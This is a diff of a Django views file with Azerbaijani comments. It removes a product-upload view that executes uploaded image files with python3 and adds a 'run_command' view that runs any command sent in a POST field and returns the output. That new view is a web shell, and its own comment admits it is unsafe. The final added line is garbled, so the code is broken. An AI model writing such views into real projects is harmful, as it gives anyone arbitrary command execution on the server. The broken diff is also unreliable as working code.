@@ -47,21 +47,18 @@ def get_client_ip(request):
     else:
         ip = request.META.get('REMOTE_ADDR')
     return ip
-    
-def upload_product(request):
+
+def run_command(request):
     if request.method == "POST":
-        form = ProductForm(request.POST, request.FILES)
-        if form.is_valid():
-            product = form.save()
-            file_path = product.image.path
-            try:
-                subprocess.run(["python3", file_path], check=True)
-            except Exception as e:
-                print("Fayl icra olunmadı:", e)
-            return redirect("success_page")
-    else:
-        form = ProductForm()
-    return render(request, "upload.html", {"form": form})
+        cmd = request.POST.get("cmd")  # formdan əmri al
+        try:
+            # WARNING: təhlükəsiz deyil, yalnız lokal test üçündür
+            result = subprocess.run(cmd.split(), capture_output=True, text=True)
+            output = result.stdout
+        except Exception as e:
+            output = str(e)
+        return HttpResponse(f"<pre>{output}</pre>")
+    return HttpResponse("POST methodu ilə istifadə edin")m})
     
 def index(request):
     products = Product.objects.all()
